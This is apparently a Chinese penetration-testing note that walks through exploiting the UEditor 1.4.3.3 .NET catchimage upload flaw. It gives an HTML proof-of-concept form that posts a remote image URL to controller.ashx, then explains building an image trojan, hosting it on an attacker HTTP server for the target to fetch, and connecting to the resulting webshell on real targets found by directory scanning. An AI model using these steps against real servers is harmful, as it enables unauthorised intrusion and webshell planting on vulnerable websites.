这个漏洞我一直没有成功过，要复现一波。

2022年9月25 更新了一下原理，解读了源码以及从源码的角度去绕waf<br />[https://www.yuque.com/aufeng/aufeng_good/smmflw](https://www.yuque.com/aufeng/aufeng_good/smmflw)

ueditor  1.4.3.3 Net版<br />[https://copyfuture.com/blogs-details/202007290059457205bedrikh7z0by2c](https://copyfuture.com/blogs-details/202007290059457205bedrikh7z0by2c)

漏洞特征。但是有时候ueditor的位置不一定在根目录下，出现以下情况，很有可能存在漏洞。而且目标服务器还得要出网才行。<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614439148295-fb78454b-872a-4d80-98bb-092987f9df2b.png#height=130&id=vcUO0&originHeight=173&originWidth=977&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18903&status=done&style=none&title=&width=733)<br />POC
```html
<form action="http://ip/ueditor/net/controller.ashx?action=catchimage"enctype="application/x-www-form-urlencoded"  method="POST">
  <p>shell addr:<input type="text" name="source[]" /></p >
  <input type="submit" value="Submit" />
</form>
```

漏洞复现：<br />实战发现这个，403禁止访问，证明可能存在其他页面。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1620985278917-773c5d68-2635-4e54-b26d-5a895e15d669.png#height=187&id=Pxj47&originHeight=249&originWidth=785&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27344&status=done&style=none&title=&width=589)<br />直接扫描目录发现存在ueditor的路径。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1620985357231-4ab91d12-8084-4ede-b4aa-28352c504dcb.png#height=194&id=bFOBW&originHeight=259&originWidth=655&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28926&status=done&style=none&title=&width=491)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1620985515709-4aed280a-30b9-402c-a34e-773dad6e7f0f.png#height=107&id=nC5Gu&originHeight=142&originWidth=765&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16615&status=done&style=none&title=&width=574)

注意！powershell生产图片马会报错的。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1620984948808-0b0d6d9d-ad90-4fe4-925f-03faef596052.png#height=360&id=BFr37&originHeight=360&originWidth=837&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27589&status=done&style=none&title=&width=837)<br />用CMD命令框生成就行。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1620985048100-5c3a8167-8b61-4215-9325-a83ceeb26316.png#height=370&id=FdVB3&originHeight=493&originWidth=740&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47366&status=done&style=none&title=&width=555)<br />然后将该图片马传至服务器上。然后起一层http的服务就可以。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1620985249879-f9b67a89-fd2e-427f-92fc-df8bb8376e8c.png#height=79&id=uZMMh&originHeight=79&originWidth=320&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4497&status=done&style=none&title=&width=320)

然后把漏洞路径替换掉action<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1620985472704-344a8027-2434-4715-8760-5e15130c50d4.png#height=101&id=glH9c&originHeight=202&originWidth=1409&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29145&status=done&style=none&title=&width=704.5)<br />输入服务器的地址<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1620985685818-216ef9b4-def8-4175-98cc-113ff6a1f12d.png#height=124&id=MEbSJ&originHeight=165&originWidth=711&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10652&status=done&style=none&title=&width=533)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1620985975794-4c453721-b90d-41a5-9ac6-b39ef6d8c65f.png#height=181&id=XtCXq&originHeight=241&originWidth=933&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62351&status=done&style=none&title=&width=700)

需要把返回的路径拼接在[/ueditor/net/](http://192.168.0.103/ueditor/net/)后面<br />[http://ip/ueditor/net/](http://192.168.0.103/ueditor/net/)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1620986084104-e1605f6c-fd97-4472-95d4-cde2c1a0bd21.png#height=117&id=hdC8C&originHeight=233&originWidth=963&originalType=binary&ratio=1&rotation=0&showTitle=false&size=299882&status=done&style=none&title=&width=481.5)<br />但有时候返回的值不一定是这样子的，所以要按照实际情况去连webshell。
